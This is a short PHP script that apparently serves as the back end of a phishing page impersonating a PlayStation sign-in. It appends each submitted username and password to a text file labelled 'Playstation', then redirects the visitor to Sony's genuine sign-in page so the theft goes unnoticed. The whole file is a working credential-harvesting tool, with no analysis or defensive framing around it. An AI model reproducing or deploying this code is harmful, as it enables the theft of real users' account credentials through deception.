<?php

file_put_contents("usernames.txt", "Playstation :- username : " . $_POST['username'] . "  || pass : " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://id.sonyentertainmentnetwork.com/signin/?#/signin?entry=%2Fsignin/');
exit();
